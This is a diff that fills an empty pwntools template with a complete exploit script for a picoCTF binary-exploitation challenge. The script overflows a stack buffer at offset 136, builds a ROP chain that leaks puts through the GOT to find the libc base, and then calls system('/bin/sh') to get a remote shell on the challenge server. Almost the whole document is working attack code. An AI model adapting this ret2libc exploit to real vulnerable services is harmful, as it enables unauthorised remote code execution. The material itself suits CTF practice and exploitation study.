@@ -1,32 +1,41 @@
-#!/usr/bin/env python3
-
+from os import system
 from pwn import *
+from pwnlib.util.proc import tracer
 
-exe = ELF("./vuln_patched")
+# io = process("./vuln_patched")
+io = remote("mercury.picoctf.net", 1774)
+
+elf = ELF("./vuln_patched")
 libc = ELF("./libc.so.6")
-ld = ELF("./ld-2.27.so")
+rop = ROP(elf)
 
-context.binary = exe
-
-
-def conn():
-    if args.LOCAL:
-        r = process([exe.path])
-        if args.DEBUG:
-            gdb.attach(r)
-    else:
-        r = remote("addr", 1337)
-
-    return r
+puts_got = elf.got["puts"]
+puts_plt = elf.plt["puts"]
+do_stuff = elf.symbols["do_stuff"]
+pop_rid = rop.find_gadget(["pop rdi", "ret"])[0]
+ret = rop.find_gadget(["ret"])[0]
 
 
-def main():
-    r = conn()
+offset = 136
+payload = b"a" * offset
+payload += p64(pop_rid)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(do_stuff)
 
-    # good luck pwning :)
+io.recvuntil(b"WeLcOmE To mY EcHo sErVeR!\n")
+io.sendline(payload)
+print(io.recvline())
 
-    r.interactive()
+libc_puts = u64(io.recvline().rstrip().ljust(8, b"\x00"))
+libc.address = libc_puts - libc.symbols["puts"]
+print(f"libc base: {hex(libc.address)}")
 
+payload2 = b"a" * offset
+payload2 += p64(ret)
+payload2 += p64(pop_rid)
+payload2 += p64(next(libc.search(b"/bin/sh")))
+payload2 += p64(libc.symbols["system"])
 
-if __name__ == "__main__":
-    main()
+io.sendline(payload2)
+io.interactive()
